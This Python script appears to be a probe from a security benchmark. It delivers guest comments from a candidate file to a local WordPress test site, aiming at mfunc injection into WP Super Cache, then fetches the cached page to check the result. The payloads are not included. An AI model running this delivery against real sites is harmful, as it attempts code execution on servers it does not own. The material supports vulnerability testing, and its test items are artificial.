#!/usr/bin/env python3
"""Method-side executable probe: guest-comment mfunc into real WP Super Cache.

Usage: python3 seed_exec.py <candidate.json> [version]

Posts candidate["comments"] to the published pcb-cache-post via HTTP
/wp-comments-post.php, then GETs the post twice as an anonymous client so Super
Cache generates and then serves the PHP page cache. PCB_TARGET_PORT overrides
the published host port.
"""
from __future__ import annotations

import json
import os
import re
import sys
import time

import requests

POST_PATH = "/pcb-cache-post/"
BASE = {
    "v0": "http://127.0.0.1:39550",
    "v1": "http://127.0.0.1:39551",
    "v2": "http://127.0.0.1:39552",
}

_pbt = os.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _v in list(BASE):
        BASE[_v] = _pbt
_pt = os.environ.get("PCB_TARGET_PORT")
if _pt:
    for _v in list(BASE):
        BASE[_v] = f"http://127.0.0.1:{int(_pt)}"


def _post_id(html: str) -> str | None:
    m = re.search(
        r'name=[\'"]comment_post_ID[\'"][^>]*value=[\'"](\d+)[\'"]',
        html,
        re.I,
    )
    if m:
        return m.group(1)
    m = re.search(
        r'value=[\'"](\d+)[\'"][^>]*name=[\'"]comment_post_ID[\'"]',
        html,
        re.I,
    )
    return m.group(1) if m else None


def _get_anon(base: str, path: str, timeout: int = 20) -> requests.Response:
    return requests.get(
        f"{base}{path}",
        timeout=timeout,
        allow_redirects=True,
        headers={"User-Agent": "PCB-WPSC-Verify/1.0"},
    )


def run_probe(candidate, *, version="v1"):
    base = BASE[version]
    comments = candidate.get("comments", []) if isinstance(candidate, dict) else [str(candidate)]
    mode = candidate.get("mode", "") if isinstance(candidate, dict) else ""
    result = {"version": version, "mode": mode, "post_statuses": []}
    try:
        r0 = _get_anon(base, POST_PATH)
        result["post_get0"] = r0.status_code
        pid = _post_id(r0.text or "")
        result["post_id"] = pid
        if not pid:
            result["error"] = "comment_post_ID missing (comments closed or theme has no form)"
            result["body"] = (r0.text or "")[:800]
            return result

        for i, body in enumerate(comments):
            s = requests.Session()
            s.headers["User-Agent"] = "PCB-WPSC-Verify/1.0"
            rr = s.post(
                f"{base}/wp-comments-post.php",
                data={
                    "comment": body,
                    "author": f"guest{i}",
                    "email": f"guest{i}-{int(time.time())}@example.com",
                    "url": "",
                    "comment_post_ID": pid,
                    "comment_parent": "0",
                    "submit": "Post Comment",
                },
                timeout=20,
                allow_redirects=False,
            )
            result["post_statuses"].append(
                {"status": rr.status_code, "location": (rr.headers.get("Location") or "")[:180]}
            )

        bodies = []
        for _ in range(3):
            time.sleep(0.4)
            rg = _get_anon(base, POST_PATH)
            bodies.append(rg.text or "")
            result["cache_get"] = rg.status_code
            if "WP-Super-Cache" in (rg.headers.get("WP-Super-Cache") or "") or \
               "WP-Super-Cache" in ",".join(rg.headers.keys()):
                result["wpsc_header"] = rg.headers.get("WP-Super-Cache", "present")
        result["body"] = bodies[-1] if bodies else ""
        result["body_joined"] = "\n".join(bodies)
    except Exception as e:  # noqa: BLE001
        result["error"] = f"{type(e).__name__}: {e}"
        result["body"] = result.get("body") or ""
    return result


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    print(json.dumps(run_probe(cand, version=version), default=str))
